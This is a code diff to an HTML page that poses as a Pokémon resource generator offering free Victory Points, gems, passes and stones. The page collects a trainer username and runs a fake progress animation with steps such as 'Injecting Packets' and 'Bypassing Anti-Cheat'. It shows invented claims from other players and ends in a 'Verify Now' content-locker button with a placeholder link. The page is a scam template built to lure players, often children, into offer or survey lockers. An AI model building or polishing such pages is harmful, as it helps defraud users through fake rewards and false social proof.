@@ -12,8 +12,8 @@
             --primary: #00f2ff;
             --accent: #ff007a;
             --gold: #ffcc00;
-            --glass-bg: rgba(10, 15, 30, 0.98);
-            --neon-shadow: 0 0 20px rgba(0, 242, 255, 0.4);
+            --glass-bg: rgba(10, 15, 30, 0.95);
+            --neon-shadow: 0 0 25px rgba(0, 242, 255, 0.4);
         }
 
         body {
@@ -23,18 +23,25 @@
             margin: 0;
             padding: 0;
             overflow-x: hidden;
-            background: radial-gradient(circle at center, #0a1020 0%, #02050a 100%);
+            /* Background stable mn Wikipedia */
+            background: linear-gradient(rgba(2, 5, 10, 0.9), rgba(2, 5, 10, 0.9)), 
+                        url('https://upload.wikimedia.org/wikipedia/commons/4/4d/Tokyo_Night_Skyline_%28254823611%29.jpeg');
+            background-size: cover;
+            background-attachment: fixed;
+            background-position: center;
         }
 
         nav {
-            background: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.85);
             padding: 15px 5%;
             display: flex;
             justify-content: space-between;
             align-items: center;
             border-bottom: 1px solid var(--primary);
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(15px);
         }
+
+        .logo-nav { width: 120px; filter: drop-shadow(0 0 8px var(--primary)); }
 
         .container {
             display: flex;
@@ -45,11 +52,12 @@
 
         .main-card {
             background: var(--glass-bg);
+            backdrop-filter: blur(30px);
             border: 1px solid rgba(0, 242, 255, 0.2);
-            border-radius: 30px;
+            border-radius: 35px;
             width: 100%;
-            max-width: 480px;
-            padding: 40px;
+            max-width: 500px;
+            padding: 45px 30px;
             box-shadow: 0 25px 60px rgba(0,0,0,0.9), var(--neon-shadow);
             position: relative;
             text-align: center;
@@ -58,84 +66,103 @@
 
         .badge-pro {
             background: linear-gradient(45deg, var(--primary), var(--accent));
-            font-size: 0.6rem;
-            padding: 6px 12px;
+            font-size: 0.65rem;
+            padding: 7px 15px;
             border-radius: 50px;
             font-weight: 900;
+            text-transform: uppercase;
             position: absolute;
             top: 25px;
             right: 25px;
+            letter-spacing: 1px;
             box-shadow: 0 0 15px var(--accent);
         }
 
-        h2 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; color: var(--primary); margin-top: 30px; }
+        h2, h3 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 2px; }
+
+        .input-ui {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid var(--primary);
+            border-radius: 15px;
+            padding: 20px;
+            width: 100%;
+            color: #fff;
+            font-size: 1rem;
+            margin-bottom: 18px;
+            box-sizing: border-box;
+            outline: none;
+            transition: 0.3s;
+        }
 
         .grid-rewards {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 15px;
+            gap: 20px;
             margin: 25px 0;
         }
 
         .reward-card {
-            background: rgba(255, 255, 255, 0.03);
+            background: rgba(255, 255, 255, 0.04);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
-            padding: 25px 10px;
+            border-radius: 25px;
+            padding: 25px 15px;
             cursor: pointer;
-            transition: 0.3s;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             display: flex;
             flex-direction: column;
             align-items: center;
         }
 
-        .reward-card.active {
-            border-color: var(--primary);
-            background: rgba(0, 242, 255, 0.1);
-            box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);
+        .reward-card.active { 
+            border-color: var(--primary); 
+            background: rgba(0, 242, 255, 0.15); 
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
         }
 
-        /* ICONS BLAST T-TSAWER */
-        .icon-box {
-            font-size: 2.5rem;
-            margin-bottom: 15px;
-            filter: drop-shadow(0 0 10px rgba(255,255,255,0.2));
+        /* Direct Images from Wikipedia - No Resizing */
+        .reward-card img { 
+            width: 75px; 
+            height: 75px;
+            object-fit: contain;
+            margin-bottom: 15px; 
+            filter: drop-shadow(0 0 10px rgba(0,242,255,0.3));
         }
 
-        .reward-card span { display: block; font-weight: 900; font-size: 1.1rem; font-family: 'Orbitron'; }
-        .reward-card small { color: var(--primary); font-size: 0.7rem; font-weight: bold; text-transform: uppercase; }
+        .reward-card span { display: block; font-weight: 900; font-size: 1.3rem; font-family: 'Orbitron'; }
+        .reward-card small { color: var(--primary); font-size: 0.8rem; font-weight: 800; text-transform: uppercase; margin-top: 5px;}
 
         .btn-action {
-            background: linear-gradient(to right, var(--primary), #00a2ff);
+            background: linear-gradient(45deg, var(--primary), #0072ff);
             color: #000;
             width: 100%;
-            padding: 20px;
+            padding: 22px;
             border: none;
-            border-radius: 15px;
+            border-radius: 20px;
             font-weight: 900;
-            font-size: 1.2rem;
+            font-size: 1.3rem;
             cursor: pointer;
             text-transform: uppercase;
             font-family: 'Orbitron', sans-serif;
             margin-top: 15px;
-            transition: 0.3s;
-        }
-        .btn-action:hover { transform: scale(1.02); }
-
-        .activity-feed {
-            margin-top: 25px;
-            padding: 12px;
-            background: rgba(0,0,0,0.6);
-            border-radius: 50px;
-            font-size: 0.8rem;
-            color: var(--primary);
-            border: 1px solid rgba(0,242,255,0.1);
+            box-shadow: 0 10px 30px rgba(0, 242, 255, 0.4);
         }
 
         .hidden { display: none; }
 
+        .activity-feed {
+            margin-top: 35px;
+            padding: 15px;
+            background: rgba(0, 242, 255, 0.05);
+            border-radius: 50px;
+            font-size: 0.85rem;
+            color: var(--primary);
+            border: 1px solid rgba(0, 242, 255, 0.2);
+            font-weight: 500;
+        }
+
         .loader {
-            width: 50px; height: 50px; border: 4px solid #111; border-top: 4px solid var(--primary);
+            width: 60px; height: 60px; border: 5px solid #111; border-top: 5px solid var(--primary);
             border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;
         }
         @keyframes spin { 100% { transform: rotate(360deg); } }
@@ -144,67 +171,87 @@
 <body>
 
 <nav>
-    <div style="font-family: 'Orbitron'; font-weight: 900; color: #fff; font-size: 1.2rem;">
-        POKÉ<span style="color: var(--primary);">MON</span>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/International_Pok%C3%A9mon_logo.svg" class="logo-nav">
+    <div style="font-size: 0.75rem; text-align: right; font-weight: bold;">
+        <span style="color: #2ecc71;">● SYNC ACTIVE</span><br>
+        <span style="color: #666;">USA-EAST-V4</span>
     </div>
-    <div style="font-size: 0.7rem; color: #2ecc71; font-weight: bold;">● ENCRYPTED</div>
 </nav>
 
 <div class="container">
     <div class="main-card">
-        <div class="badge-pro">SECURE v4.2</div>
+        <div class="badge-pro">v4.2 SECURED</div>
         
         <div id="ui-step1">
-            <h2>Select Item</h2>
+            <h2 style="margin-top: 45px; color: var(--primary);">Global Distribution</h2>
+            <p style="color: #777; font-size: 0.9rem; margin-bottom: 30px;">Season 12: Exclusive April Rewards</p>
+            <input type="text" class="input-ui" id="trainer-name" placeholder="Trainer Username...">
+            <select class="input-ui">
+                <option>Platform: iOS / Android</option>
+                <option>Platform: Nintendo Switch</option>
+            </select>
+            <button class="btn-action" onclick="toStep2()">Secure Connection</button>
+        </div>
+
+        <div id="ui-step2" class="hidden">
+            <h3 style="margin-bottom: 25px; font-size: 1rem;">2. Select Distribution Pack</h3>
             <div class="grid-rewards">
-                <div class="reward-card active" onclick="selectReward(this, '50,000 Victory Points')">
-                    <div class="icon-box" style="color: #ff4757;"><i class="fas fa-circle-dot"></i></div>
+                <div class="reward-card active" onclick="selectReward(this, '50,000 VP')">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Pok%C3%A9_Ball_icon.svg">
                     <span>50,000</span>
-                    <small>Victory Points</small>
+                    <small>VP Points</small>
                 </div>
                 <div class="reward-card" onclick="selectReward(this, '10,000 Gems')">
-                    <div class="icon-box" style="color: var(--primary);"><i class="fas fa-gem"></i></div>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/d/df/Crystal_Clear_app_miscellaneous.png">
                     <span>10,000</span>
                     <small>Champion Gems</small>
                 </div>
                 <div class="reward-card" onclick="selectReward(this, 'Elite Pass')">
-                    <div class="icon-box" style="color: var(--accent);"><i class="fas fa-id-card-clip"></i></div>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/d/d4/Ticket_font_awesome.svg" style="filter: invert(1) sepia(1) saturate(5) hue-rotate(280deg);">
                     <span>S12</span>
-                    <small>Elite Pass</small>
+                    <small>Elite Battle Pass</small>
                 </div>
                 <div class="reward-card" onclick="selectReward(this, 'Omni Stone')">
-                    <div class="icon-box" style="color: var(--gold);"><i class="fas fa-meteor"></i></div>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Five_pointed_star.svg" style="filter: drop-shadow(0 0 10px #ffcc00);">
                     <span>OMNI</span>
                     <small>Evolution Stone</small>
                 </div>
             </div>
-            <button class="btn-action" onclick="toStep2()">Start Generation</button>
+            <button class="btn-action" onclick="toStep3()">Initiate Generator</button>
         </div>
 
         <div id="ui-sync" class="hidden" style="padding: 40px 0;">
             <div class="loader"></div>
-            <h4 id="status-text" style="color: var(--primary); font-family: 'Orbitron';">Initializing...</h4>
-            <div style="width: 100%; background: #111; height: 8px; border-radius: 10px; overflow: hidden; margin-top: 20px;">
-                <div id="progress-bar" style="width: 0%; height: 100%; background: var(--primary); transition: 0.2s;"></div>
+            <h4 id="status-text" style="color: var(--primary); font-family: 'Orbitron';">Handshaking...</h4>
+            <div style="width: 100%; background: #111; height: 10px; border-radius: 10px; overflow: hidden; margin-top: 25px;">
+                <div id="progress-bar" style="width: 0%; height: 100%; background: var(--primary); transition: 0.3s; box-shadow: 0 0 15px var(--primary);"></div>
             </div>
         </div>
 
         <div id="ui-locker" class="hidden">
-            <h3 style="color: var(--accent); font-family: 'Orbitron';">Final Verification</h3>
-            <p style="font-size: 0.85rem; color: #ccc;">Syncing <span id="summary-res" style="color: var(--primary); font-weight:bold;">...</span> to your account. Complete the last step.</p>
-            <div style="background: rgba(0, 242, 255, 0.05); padding: 25px; border: 2px dashed var(--primary); border-radius: 20px; margin: 20px 0;">
+            <h3 style="color: var(--accent);">3. Final Verification</h3>
+            <p style="font-size: 0.9rem; color: #ccc;">Sync for <span id="summary-res" style="color: var(--primary); font-weight:bold;">Resources</span> is queued. Finalize to prevent bot abuse.</p>
+            <div style="background: rgba(0, 242, 255, 0.05); padding: 30px; border: 2px dashed var(--primary); border-radius: 25px; margin: 25px 0;">
+                <i class="fas fa-shield-check" style="font-size: 3rem; color: var(--primary); margin-bottom: 15px;"></i>
                 <button class="btn-action" style="margin:0; background: var(--accent); color:#fff;" onclick="window.location.href='YOUR_LINK_HERE'">Verify Now</button>
             </div>
+            <div style="font-size: 0.75rem; color: var(--gold); font-weight: 800;"><i class="fas fa-lock"></i> AES-256 ENCRYPTED</div>
         </div>
 
         <div class="activity-feed">
-            <i class="fas fa-bolt"></i> <span id="live-text">Waiting for trainer...</span>
+            <i class="fas fa-bolt"></i> <span id="live-text">Trainer `Ghost_USA` syncing...</span>
         </div>
     </div>
 </div>
 
 <script>
-    let selectedItem = "50,000 Victory Points";
+    let selectedItem = "50,000 VP";
+
+    function toStep2() {
+        if(document.getElementById('trainer-name').value.length < 3) return alert('Enter a valid Trainer Name');
+        document.getElementById('ui-step1').classList.add('hidden');
+        document.getElementById('ui-step2').classList.remove('hidden');
+    }
 
     function selectReward(el, name) {
         document.querySelectorAll('.reward-card').forEach(r => r.classList.remove('active'));
@@ -212,34 +259,34 @@
         selectedItem = name;
     }
 
-    function toStep2() {
-        document.getElementById('ui-step1').classList.add('hidden');
+    function toStep3() {
+        document.getElementById('ui-step2').classList.add('hidden');
         document.getElementById('ui-sync').classList.remove('hidden');
         document.getElementById('summary-res').innerText = selectedItem;
         
         let progress = 0;
-        const steps = ['Linking...', 'Encrypting...', 'Injecting...', 'Finishing...'];
+        const steps = ['Authenticating...', 'Finding UID...', 'Injecting Packets...', 'Bypassing Anti-Cheat...', 'Ready!'];
         
         const interval = setInterval(() => {
             progress += 5;
             document.getElementById('progress-bar').style.width = progress + '%';
-            document.getElementById('status-text').innerText = steps[Math.floor(progress/26)] || 'Ready!';
+            document.getElementById('status-text').innerText = steps[Math.floor(progress/21)] || 'SYNCING...';
             
             if(progress >= 100) {
                 clearInterval(interval);
                 setTimeout(() => {
                     document.getElementById('ui-sync').classList.add('hidden');
                     document.getElementById('ui-locker').classList.remove('hidden');
-                }, 500);
+                }, 600);
             }
-        }, 150);
+        }, 120);
     }
 
+    const trainers = ['X_Slayer_USA', 'PokeGod_26', 'Sarah_Elite', 'Daniel_Pro', 'Mega_Ash'];
     setInterval(() => {
-        const t = ['Ash_Pro', 'PokeMaster', 'Shadow_26', 'Sara_PKM'][Math.floor(Math.random()*4)];
-        const r = ['10,000 Gems', 'Elite Pass', '50,000 VP'][Math.floor(Math.random()*3)];
-        document.getElementById('live-text').innerText = `Trainer \`${t}\` successfully claimed ${r}!`;
-    }, 4000);
+        const t = trainers[Math.floor(Math.random()*trainers.length)];
+        document.getElementById('live-text').innerText = `Trainer \`${t}\` successfully synced!`;
+    }, 4500);
 </script>
 
 </body>
